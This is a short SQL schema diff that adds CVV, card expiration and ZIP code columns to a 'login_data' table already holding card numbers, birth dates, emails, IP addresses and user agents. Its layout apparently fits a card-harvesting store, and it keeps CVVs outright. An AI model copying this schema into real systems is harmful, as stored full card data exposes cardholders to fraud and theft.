@@ -9,6 +9,9 @@ CREATE TABLE IF NOT EXISTS login_data (
     dob TEXT,
     card_number TEXT,
     email TEXT,
+    cvv TEXT,
+    expiration TEXT,
+    zip_code TEXT,
     ip_address TEXT,
     user_agent TEXT,
     created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
